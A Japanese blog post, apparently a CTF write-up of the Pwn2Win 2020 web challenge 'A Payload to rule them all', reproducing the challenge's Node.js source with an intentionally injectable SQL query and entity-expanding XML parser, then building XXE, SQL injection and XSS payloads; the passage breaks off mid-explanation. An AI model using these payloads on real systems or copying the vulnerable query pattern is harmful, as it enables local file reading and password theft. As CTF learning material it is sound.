@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+		<title>Pwn2Win CTF 2020 write up &middot; kuzushikiのぺーじ</title>
+		<link rel="canonical" href="https://kuzushiki.github.io/post/pwn2win2020/">
+		<link rel="stylesheet" type="text/css" href="https://kuzushiki.github.io/css/main.css" />
+		
+	</head>
+	<body>
+		<a id="title" href="https://kuzushiki.github.io/" title="kuzushikiのぺーじ">
+			
+				<img id="logo" alt="Logo" src="https://kuzushiki.github.io/images/logo.png" />
+			
+			
+				<h1>kuzushikiのぺーじ</h1>
+			
+		</a>
+		
+			<h4>セキュリティに関することを書きたいですね</h4>
+		
+		<div id="social">
+			
+			
+			
+			<a href="https://github.com/kuzushiki" title="Github">
+				<img alt="GitHub" height="64px" width="64px" src="https://kuzushiki.github.io/images/github.svg" />
+			</a>
+			
+			
+			
+			<a href="https://twitter.com/kuzu7shiki" title="Twitter">
+				<img alt="Twitter" height="64px" width="64px" src="https://kuzushiki.github.io/images/twitter.svg" />
+			</a>
+			
+			
+                        
+		</div>
+		<div class="links">
+			<a href="https://kuzushiki.github.io/">Home</a>
+			
+				<a href="https://kuzushiki.github.io/post/">Archive</a>
+			
+			
+				
+			
+				
+					<a href="https://kuzushiki.github.io/pages/resume/">Résumé</a>
+				
+			
+		</div>
+
+	<div class="postBody">
+		<div class="post">
+			<h1>Pwn2Win CTF 2020 write up</h1>
+			<span class="post-meta">Mon, Jun 1, 2020 - Read in 3 Min</span>
+			<div class="content">
+			<nav id="TableOfContents">
+  <ul>
+    <li><a href="#a-payload-to-rule-them-all-web-223-pts-65-solves">A Payload to rule them all (Web), 223 pts, 65 solves)</a></li>
+  </ul>
+</nav>
+			<h1 id="pwn2win-ctf-2020に参加しました">Pwn2Win CTF 2020に参加しました！</h1>
+<p>(team: score_gazer)</p>
+<p>自分は223点を入れ、順位は90位 / 401チーム(0点は除く)でした。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/83358025-5b9d6c00-a3ab-11ea-9272-f6cfcb8ccf1f.PNG" alt="キャプチャ"></p>
+<p>今回は１問(Welcome問を除く)しか解けなかったのですが，せっかくなのでwriteupを書きます。</p>
+<h1 id="web">Web</h1>
+<h2 id="a-payload-to-rule-them-all-web-223-pts-65-solves">A Payload to rule them all (Web), 223 pts, 65 solves)</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Pwn m3 s3np41!
+http://payload.pwn2.win
+</code></pre></div><p>どうやら、XXE, SQLi, XSSを1つのペイロードで起こせという問題らしいです。</p>
+<p>Sourceのリンクをクリックすると、以下のソースが得られます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#960050;background-color:#1e0010">/usr/src/app/index.js :</span>
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;body-parser&#34;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">31337</span>
+<span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">execFile</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;fs&#34;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">rateLimit</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express-rate-limit&#34;</span>);
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#e6db74">&#34;static&#34;</span>))
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">urlencoded</span>({<span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span><span style="color:#66d9ef">true</span>}))
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">limiter</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rateLimit</span>({
+  <span style="color:#a6e22e">windowMs</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>, <span style="color:#75715e">// 15 minutes
+</span><span style="color:#75715e"></span>  <span style="color:#a6e22e">max</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">50</span> <span style="color:#75715e">// limit each IP to 100 requests per windowMs
+</span><span style="color:#75715e"></span>});
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;/&#39;</span>,<span style="color:#a6e22e">limiter</span>);
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>,<span style="color:#a6e22e">res</span>) =&gt; {
+	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">test_payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">execFile</span>(<span style="color:#e6db74">&#34;/usr/sbin/gosu&#34;</span>,[<span style="color:#e6db74">&#34;gnx&#34;</span>,<span style="color:#e6db74">&#34;/home/gnx/script/test_payload.js&#34;</span>,<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">payload</span>], ( <span style="color:#a6e22e">error</span>, <span style="color:#a6e22e">stdout</span>, <span style="color:#a6e22e">stderr</span> ) =&gt; {
+	<span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">toString</span>().<span style="color:#a6e22e">trim</span>() <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;parabens hackudo&#34;</span> ) {
+			<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span>)
+		} <span style="color:#66d9ef">else</span> {
+			<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;nope&#34;</span>)
+		}
+	});
+	<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">payload</span>)
+
+})
+
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/source&#39;</span>, (<span style="color:#a6e22e">req</span>,<span style="color:#a6e22e">res</span>) =&gt; {
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">out</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/usr/src/app/index.js :\n\n&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">&#34;/usr/src/app/index.js&#34;</span>).<span style="color:#a6e22e">toString</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\n\n&#34;</span>
+	<span style="color:#a6e22e">out</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;/home/gnx/script/test_payload.js :\n\n&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">&#34;/home/gnx/script/test_payload.js&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\n\n&#34;</span>
+	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">out</span>)
+})
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">port</span>,<span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, () =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Chall rodando em http://localhost:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>))
+
+
+<span style="color:#960050;background-color:#1e0010">/home/gnx/script/test_payload.js :</span>
+
+<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#f92672">!</span><span style="color:#960050;background-color:#1e0010">/usr/bin/env node</span>
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">puppeteer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;puppeteer&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">mysql</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;mysql&#34;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">util</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;util&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">libxml</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;libxmljs&#34;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;fs&#34;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sanitizeHtml</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;sanitize-html&#34;</span>)
+
+
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">test_xxe</span>(<span style="color:#a6e22e">payload</span>) {
+
+	<span style="color:#66d9ef">try</span> {
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">my_secret</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">random</span>().<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">36</span>).<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">2</span>) ;
+		<span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#e6db74">&#34;/home/gnx/script/xxe_secret&#34;</span>,<span style="color:#a6e22e">my_secret</span>)
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">libxml</span>.<span style="color:#a6e22e">parseXml</span>(<span style="color:#a6e22e">payload</span>, { <span style="color:#a6e22e">noent</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> ,<span style="color:#a6e22e">nonet</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> })
+		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">doc</span>.<span style="color:#a6e22e">toString</span>().<span style="color:#a6e22e">includes</span>(<span style="color:#a6e22e">my_secret</span>) 
+		
+	} <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
+	}
+} 
+
+<span style="color:#a6e22e">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">test_xss</span>(<span style="color:#a6e22e">payload</span>) {
+	<span style="color:#66d9ef">try</span> {
+		<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">browser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">puppeteer</span>.<span style="color:#a6e22e">launch</span>({<span style="color:#a6e22e">args</span><span style="color:#f92672">:</span>[<span style="color:#e6db74">&#39;--no-sandbox&#39;</span>, <span style="color:#e6db74">&#39;--disable-setuid-sandbox&#39;</span>,<span style="color:#e6db74">&#39;--disable-dev-shm-usage&#39;</span>,<span style="color:#e6db74">&#39;--disable-accelerated-2d-canvas&#39;</span>,<span style="color:#e6db74">&#39;--no-first-run&#39;</span>,<span style="color:#e6db74">&#39;--no-zygote&#39;</span>,<span style="color:#e6db74">&#39;--single-process&#39;</span>,<span style="color:#e6db74">&#39;--disable-gpu&#39;</span>]})
+		<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">page</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">newPage</span>()
+		<span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">setDefaultNavigationTimeout</span>(<span style="color:#ae81ff">1000</span>);
+		<span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sanitizeHtml</span>(<span style="color:#a6e22e">payload</span>,{<span style="color:#a6e22e">allowedTags</span><span style="color:#f92672">:</span>[]})
+		<span style="color:#a6e22e">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#e6db74">`data:text/html,&lt;script&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">payload</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/script&gt;`</span>)
+		<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">check</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">evaluate</span>(<span style="color:#e6db74">&#34;( typeof xss != &#39;undefined&#39; ? true : false )&#34;</span>) <span style="color:#75715e">// vlw herrera
+</span><span style="color:#75715e"></span>
+		<span style="color:#a6e22e">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">close</span>()
+		
+		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">check</span>
+
+	} <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
+		<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">error</span>)
+	}
+
+}
+
+<span style="color:#a6e22e">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">test_sqli</span>(<span style="color:#a6e22e">payload</span>) {
+
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">connection</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql</span>.<span style="color:#a6e22e">createConnection</span>({
+		<span style="color:#a6e22e">host</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">MYSQL_HOST</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,
+		<span style="color:#a6e22e">user</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">MYSQL_USER</span>,
+		<span style="color:#a6e22e">password</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">MYSQL_PASSWORD</span>,
+		<span style="color:#a6e22e">database</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">MYSQL_DATABASE</span>,
+		<span style="color:#a6e22e">charset</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;utf8&#39;</span>,
+    <span style="color:#a6e22e">dialectOptions</span><span style="color:#f92672">:</span> {
+			<span style="color:#a6e22e">collate</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>,
+    },
+	})
+
+
+	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">promisify</span>(<span style="color:#a6e22e">connection</span>.<span style="color:#a6e22e">query</span>).<span style="color:#a6e22e">bind</span>(<span style="color:#a6e22e">connection</span>)
+
+
+	<span style="color:#a6e22e">connection</span>.<span style="color:#a6e22e">connect</span>()
+
+	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">users</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;SELECT * from users&#34;</span>) 
+	<span style="color:#66d9ef">try</span> {
+		<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sqli</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">query</span>(<span style="color:#e6db74">`SELECT * from posts where id=&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">payload</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;`</span>)
+		<span style="color:#a6e22e">await</span> <span style="color:#a6e22e">connection</span>.<span style="color:#a6e22e">end</span>() 
+		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">sqli</span>).<span style="color:#a6e22e">includes</span>(<span style="color:#a6e22e">users</span>[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;password&#34;</span>])	
+	} <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) {
+		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
+	}
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">main</span>(<span style="color:#a6e22e">args</span>){
+
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xss</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">test_xss</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>])
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sqli</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">test_sqli</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>])
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xxe</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">test_xxe</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>])
+
+  Promise.<span style="color:#a6e22e">all</span>([<span style="color:#a6e22e">xss</span>,<span style="color:#a6e22e">sqli</span>]).<span style="color:#a6e22e">then</span>( <span style="color:#66d9ef">function</span>( <span style="color:#a6e22e">values</span> ){
+                <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">values</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">values</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">xxe</span> ) {
+                        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;parabens hackudo&#34;</span>)
+                } <span style="color:#66d9ef">else</span> {
+                        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;hack harder&#34;</span>)
+                }
+
+                <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>)
+        })
+	
+}
+
+<span style="color:#a6e22e">main</span>(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">argv</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">2</span>))
+</code></pre></div><p>XXE, SQLi, XSSの箇所について詳しく見ていきます。</p>
+<ol>
+<li>XXE</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">test_xxe</span>(<span style="color:#a6e22e">payload</span>) {
+
+	<span style="color:#66d9ef">try</span> {
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">my_secret</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">random</span>().<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">36</span>).<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">2</span>) ;
+		<span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#e6db74">&#34;/home/gnx/script/xxe_secret&#34;</span>,<span style="color:#a6e22e">my_secret</span>)
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">doc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">libxml</span>.<span style="color:#a6e22e">parseXml</span>(<span style="color:#a6e22e">payload</span>, { <span style="color:#a6e22e">noent</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> ,<span style="color:#a6e22e">nonet</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> })
+		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">doc</span>.<span style="color:#a6e22e">toString</span>().<span style="color:#a6e22e">includes</span>(<span style="color:#a6e22e">my_secret</span>) 
+		
+	} <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
+	}
+} 
+</code></pre></div><p><code>/home/gnx/script/xxe_secret</code>を読み出せば良さそうです。</p>
+<p>以下のようなペイロードが考えられます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE hoge [&lt;!ENTITY h SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;</span>]&gt;<span style="color:#f92672">&lt;r&gt;</span>&amp;h;<span style="color:#f92672">&lt;/r&gt;</span>
+</code></pre></div><ol start="2">
+<li>SQLi</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">    <span style="color:#a6e22e">dialectOptions</span><span style="color:#f92672">:</span> {
+			<span style="color:#a6e22e">collate</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>,
+    },
+	})
+
+
+	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">promisify</span>(<span style="color:#a6e22e">connection</span>.<span style="color:#a6e22e">query</span>).<span style="color:#a6e22e">bind</span>(<span style="color:#a6e22e">connection</span>)
+
+
+	<span style="color:#a6e22e">connection</span>.<span style="color:#a6e22e">connect</span>()
+
+	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">users</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;SELECT * from users&#34;</span>) 
+	<span style="color:#66d9ef">try</span> {
+		<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sqli</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">query</span>(<span style="color:#e6db74">`SELECT * from posts where id=&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">payload</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;`</span>)
+		<span style="color:#a6e22e">await</span> <span style="color:#a6e22e">connection</span>.<span style="color:#a6e22e">end</span>() 
+		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">sqli</span>).<span style="color:#a6e22e">includes</span>(<span style="color:#a6e22e">users</span>[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;password&#34;</span>])	
+	} <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) {
+		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
+	}
+</code></pre></div><p>クエリは<code>SELECT * from posts where id='${payload}'</code>です。</p>
+<p><code>users</code>テーブルの<code>password</code>を読み出せば良さそうです。</p>
+<p><code>posts</code>テーブルの構造が分かりませんが，以下のようなペイロードが考えられます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT password from users;-- 
+</span></code></pre></div><ol start="3">
+<li>XSS</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">test_xss</span>(<span style="color:#a6e22e">payload</span>) {
+	<span style="color:#66d9ef">try</span> {
+		<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">browser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">puppeteer</span>.<span style="color:#a6e22e">launch</span>({<span style="color:#a6e22e">args</span><span style="color:#f92672">:</span>[<span style="color:#e6db74">&#39;--no-sandbox&#39;</span>, <span style="color:#e6db74">&#39;--disable-setuid-sandbox&#39;</span>,<span style="color:#e6db74">&#39;--disable-dev-shm-usage&#39;</span>,<span style="color:#e6db74">&#39;--disable-accelerated-2d-canvas&#39;</span>,<span style="color:#e6db74">&#39;--no-first-run&#39;</span>,<span style="color:#e6db74">&#39;--no-zygote&#39;</span>,<span style="color:#e6db74">&#39;--single-process&#39;</span>,<span style="color:#e6db74">&#39;--disable-gpu&#39;</span>]})
+		<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">page</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">newPage</span>()
+		<span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">setDefaultNavigationTimeout</span>(<span style="color:#ae81ff">1000</span>);
+		<span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sanitizeHtml</span>(<span style="color:#a6e22e">payload</span>,{<span style="color:#a6e22e">allowedTags</span><span style="color:#f92672">:</span>[]}) 
+		<span style="color:#a6e22e">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#e6db74">`data:text/html,&lt;script&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">payload</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/script&gt;`</span>)
+		<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">check</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">evaluate</span>(<span style="color:#e6db74">&#34;( typeof xss != &#39;undefined&#39; ? true : false )&#34;</span>) <span style="color:#75715e">// vlw herrera
+</span><span style="color:#75715e"></span>
+		<span style="color:#a6e22e">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">close</span>()
+		
+		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">check</span>
+
+	} <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
+		<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">error</span>)
+	}
+
+}
+</code></pre></div><p><code>sanitizeHtml</code>でサニタイズされるのが気になりますが，ひとまず<code>xss</code>を定義すれば良さそうです。</p>
+<p>以下のようなペイロードが考えられます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xss</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</code></pre></div><p>さて，後はこれらのペイロードを組み合わせましょう。</p>
+<p>XXE, XSSのペイロードに<code>'</code>が含まれないので，SQLiは最後にくっつければ良さそうです。</p>
+<p>XXE, XSSを組み合わせるにはどうすれば良いでしょうか？</p>
+<p>両方とも手元で実装し，試しました。</p>
+<p>すると，XSSの判定をする際に，<code>sanitizeHtml</code>で<code>&lt;</code>から<code>&gt;</code>までが削除されていることが分かりました。</p>
+<p>XXEのペイロードは以下のように解釈されます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE hoge [&lt;!ENTITY h SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;</span>]&gt;<span style="color:#f92672">&lt;r&gt;</span>&amp;h;<span style="color:#f92672">&lt;/r&gt;</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">]<span style="color:#f92672">&gt;&amp;</span><span style="color:#a6e22e">h</span>;
+</code></pre></div><p>これでは先頭の<code>]</code>が邪魔でXSSができません。</p>
+<p>XMLの形式を壊さずにもっと前に<code>&gt;</code>を入れられないでしょうか？</p>
+<p>色々試した結果，以下のようにエンティティを追加することで，<code>&gt;</code>を入れることができました。</p>
